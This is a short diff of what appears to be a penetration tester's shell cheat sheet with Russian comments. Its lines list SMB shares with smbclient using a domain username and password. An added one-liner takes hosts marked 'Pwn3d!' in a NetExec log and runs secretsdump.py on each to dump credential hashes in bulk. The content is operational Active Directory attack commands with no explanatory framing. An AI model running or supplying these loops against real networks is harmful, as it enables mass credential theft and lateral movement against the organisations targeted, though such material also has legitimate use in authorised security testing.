@@ -15,5 +15,5 @@ cat ./* | grep -oP '([0-9a-zA-Z-_]+\.)+[0-9a-zA-Z-_]+' | sort -V | uniq
 # просмотр всех шар
 for i in $(bshm use net/smb/nxc-parser -f ./shares_user.txt --item 7 --ge print IPC); do echo -E $i; smbclient $i  -U 'domain\user%pass'; echo;  done
 
-
-
+# Автодамп по кредам
+for i in $(shm use ad/smb/xnxc -f #NXC-ЛОГ-С-КРЕДАМИ# --item 6 --gi '(Pwn3d!)'); do secretsdump.py -outputfile ${i##*@} $i; done
